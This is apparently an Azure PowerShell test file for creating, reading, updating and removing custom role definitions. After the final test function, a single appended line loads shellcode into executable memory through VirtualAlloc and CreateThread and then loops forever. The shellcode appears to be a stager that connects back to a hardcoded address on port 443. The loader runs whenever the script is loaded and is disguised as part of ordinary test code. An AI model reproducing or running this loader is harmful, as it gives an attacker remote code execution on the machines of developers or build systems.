














function Test-RoleDefinitionCreateTests
{
    
    $rdName = 'CustomRole Tests Role'
    New-AzureRmRoleDefinition -InputFile NewRoleDefinition.json

    $rd = Get-AzureRmRoleDefinition -Name $rdName
	Assert-AreEqual "Test role" $rd.Description 
	Assert-AreEqual $true $rd.IsCustom
	Assert-NotNull $rd.Actions
	Assert-AreEqual "Microsoft.Authorization/*/read" $rd.Actions[0]
	Assert-AreEqual "Microsoft.Support/*" $rd.Actions[1]
	Assert-NotNull $rd.AssignableScopes
	
	
	$roleDef = Get-AzureRmRoleDefinition -Name "Reader"
	$roleDef.Id = $null
	$roleDef.Name = "Custom Reader"
	$roleDef.Actions.Add("Microsoft.ClassicCompute/virtualMachines/restart/action")
	$roleDef.Description = "Read, monitor and restart virtual machines"
    $roleDef.AssignableScopes[0] = "/subscriptions/00977cdb-163f-435f-9c32-39ec8ae61f4d"

	New-AzureRmRoleDefinition -Role $roleDef
	$addedRoleDef = Get-AzureRmRoleDefinition -Name "Custom Reader"

	Assert-NotNull $addedRoleDef.Actions
	Assert-AreEqual $roleDef.Description $addedRoleDef.Description
	Assert-AreEqual $roleDef.AssignableScopes $addedRoleDef.AssignableScopes
	Assert-AreEqual $true $addedRoleDef.IsCustom

    Remove-AzureRmRoleDefinition -Id $addedRoleDef.Id -Force
    Remove-AzureRmRoleDefinition -Id $rd.Id -Force
    
}


function Test-RdNegativeScenarios
{
	
	Add-Type -Path ".\\Microsoft.Azure.Commands.Resources.dll"

    
    $rdName = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'
    $rdNull = Get-AzureRmRoleDefinition -Name $rdName
    Assert-Null $rdNull

    $rdId = '85E460B3-89E9-48BA-9DCD-A8A99D64A674'
	
    $badIdException = "RoleDefinitionDoesNotExist: The specified role definition with ID '" + $rdId + "' does not exist."

    
    Assert-Throws { Set-AzureRmRoleDefinition -InputFile .\Resources\RoleDefinition.json } $badIdException

    
    $roleDefNotProvided = "Parameter set cannot be resolved using the specified named parameters."
    Assert-Throws { Set-AzureRmRoleDefinition } $roleDefNotProvided

    
    $roleDefNotProvided = "Cannot validate argument on parameter 'InputFile'. The argument is null or empty. Provide an argument that is not null or empty, and then try the command again."
    Assert-Throws { Set-AzureRmRoleDefinition -InputFile "" } $roleDefNotProvided
    Assert-Throws { Set-AzureRmRoleDefinition -InputFile "" -Role $rdNull } $roleDefNotProvided

    
    $roleDefNotProvided = "Cannot validate argument on parameter 'Role'. The argument is null or empty. Provide an argument that is not null or empty, and then try the command again."
    Assert-Throws { Set-AzureRmRoleDefinition -Role $rdNull } $roleDefNotProvided
    Assert-Throws { Set-AzureRmRoleDefinition -InputFile .\Resources\RoleDefinition.json -Role $rd } $roleDefNotProvided

    

    
    $missingSubscription = "MissingSubscription: The request did not have a provided subscription. All requests must have an associated subscription Id."
    Assert-Throws { Remove-AzureRmRoleDefinition -Id $rdId -Force} $badIdException
}


function Test-RDPositiveScenarios
{
    
    Add-Type -Path ".\\Microsoft.Azure.Commands.Resources.dll"

    
    $rdName = 'Another tests role'
    [Microsoft.Azure.Commands.Resources.Models.Authorization.AuthorizationClient]::RoleDefinitionNames.Enqueue("032F61D2-ED09-40C9-8657-26A273DA7BAE")
    $rd = New-AzureRmRoleDefinition -InputFile .\Resources\RoleDefinition.json
    $rd = Get-AzureRmRoleDefinition -Name $rdName

    
    $rd.Actions.Add('Microsoft.Authorization/*/read')
    $updatedRd = Set-AzureRmRoleDefinition -Role $rd
    Assert-NotNull $updatedRd

    
    $deletedRd = Remove-AzureRmRoleDefinition -Id $rd.Id -Force -PassThru
    Assert-AreEqual $rd.Name $deletedRd.Name

    
    $readRd = Get-AzureRmRoleDefinition -Name $rd.Name
    Assert-Null $readRd
}


function Test-RDRemove
{
    
    Add-Type -Path ".\\Microsoft.Azure.Commands.Resources.dll"

    
    [Microsoft.Azure.Commands.Resources.Models.Authorization.AuthorizationClient]::RoleDefinitionNames.Enqueue("65E1D983-ECF4-42D4-8C08-5B1FD6E86335")

	$subscription = $(Get-AzureRmContext).Subscription
	$resourceGroups = Get-AzureRmResourceGroup | Select-Object -Last 1 -Wait
	
	$scope = "/subscriptions/" + $subscription[0].SubscriptionId
	$rgScope = "/subscriptions/" + $subscription[0].SubscriptionId + "/resourceGroups/" + $resourceGroups[0].ResourceGroupName

	$roleDef = Get-AzureRmRoleDefinition -Name "Reader"
	$roleDef.Id = $null
	$roleDef.Name = "CustomRole123_65E1D983-ECF4-42D4-8C08-5B1FD6E86335"
	$roleDef.Description = "Test Remove RD"
    $roleDef.AssignableScopes[0] = $rgScope

    $Rd = New-AzureRmRoleDefinition -Role $roleDef
    Assert-NotNull $Rd


    
	$badIdException = "RoleDefinitionDoesNotExist: The specified role definition with ID '" + $Rd.Id + "' does not exist."
	Assert-Throws { Remove-AzureRmRoleDefinition -Id $Rd.Id -Scope $scope -Force -PassThru} $badIdException

	
	$badIdException = "RoleDefinitionDoesNotExist: The specified role definition with ID '" + $Rd.Id + "' does not exist."
	Assert-Throws { Remove-AzureRmRoleDefinition -Id $Rd.Id -Scope $scope -Force -PassThru} $badIdException

	
	$deletedRd = Remove-AzureRmRoleDefinition -Id $Rd.Id -Scope $rgScope -Force -PassThru
	Assert-AreEqual $Rd.Name $deletedRd.Name
}


function Test-RDGet
{
    
    Add-Type -Path ".\\Microsoft.Azure.Commands.Resources.dll"
	
	$subscription = $(Get-AzureRmContext).Subscription

	$resource = Get-AzureRmResource | Select-Object -Last 1 -Wait
    Assert-NotNull $resource "Cannot find any resource to continue test execution."
	
	$subScope = "/subscriptions/" + $subscription[0].SubscriptionId
	$rgScope = "/subscriptions/" + $subscription[0].SubscriptionId + "/resourceGroups/" + $resource.ResourceGroupName
	$resourceScope = $resource.ResourceId
	
    [Microsoft.Azure.Commands.Resources.Models.Authorization.AuthorizationClient]::RoleDefinitionNames.Enqueue("99CC0F56-7395-4097-A31E-CC63874AC5EF")
	$roleDef1 = Get-AzureRmRoleDefinition -Name "Reader"
	$roleDef1.Id = $null
	$roleDef1.Name = "CustomRole_99CC0F56-7395-4097-A31E-CC63874AC5EF"
	$roleDef1.Description = "Test Get RD"
    $roleDef1.AssignableScopes[0] = $subScope 

    $roleDefSubScope = New-AzureRmRoleDefinition -Role $roleDef1
    Assert-NotNull $roleDefSubScope

	[Microsoft.Azure.Commands.Resources.Models.Authorization.AuthorizationClient]::RoleDefinitionNames.Enqueue("E3CC9CD7-9D0A-47EC-8C75-07C544065220")
	$roleDef1.Id = $null
	$roleDef1.Name = "CustomRole_E3CC9CD7-9D0A-47EC-8C75-07C544065220"
	$roleDef1.Description = "Test Get RD"
    $roleDef1.AssignableScopes[0] = $rgScope

    $roleDefRGScope = New-AzureRmRoleDefinition -Role $roleDef1
    Assert-NotNull $roleDefRGScope
	
	[Microsoft.Azure.Commands.Resources.Models.Authorization.AuthorizationClient]::RoleDefinitionNames.Enqueue("8D2E860C-5640-4B7C-BD3C-80940C715033")
	$roleDef1.Id = $null
	$roleDef1.Name = "CustomRole_8D2E860C-5640-4B7C-BD3C-80940C715033"
	$roleDef1.Description = "Test Get RD"
    $roleDef1.AssignableScopes[0] = $resourceScope

    $roleDefResourceScope = New-AzureRmRoleDefinition -Role $roleDef1
    Assert-NotNull $roleDefResourceScope

    
	$roles1 = Get-AzureRmRoleDefinition -Scope $subScope	
	

	
	$roles2 = Get-AzureRmRoleDefinition -Scope $rgScope
	

	
	$roles3 = Get-AzureRmRoleDefinition -Scope $resourceScope
	


	
	$deletedRd = Remove-AzureRmRoleDefinition -Id $roleDefSubScope.Id -Scope $subScope -Force -PassThru
	Assert-AreEqual $roleDefSubScope.Name $deletedRd.Name

	
	$deletedRd = Remove-AzureRmRoleDefinition -Id $roleDefRGScope.Id -Scope $rgScope -Force -PassThru
	Assert-AreEqual $roleDefRGScope.Name $deletedRd.Name

	
	$deletedRd = Remove-AzureRmRoleDefinition -Id $roleDefResourceScope.Id -Scope $resourceScope -Force -PassThru
	Assert-AreEqual $roleDefResourceScope.Name $deletedRd.Name
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x05,0x36,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

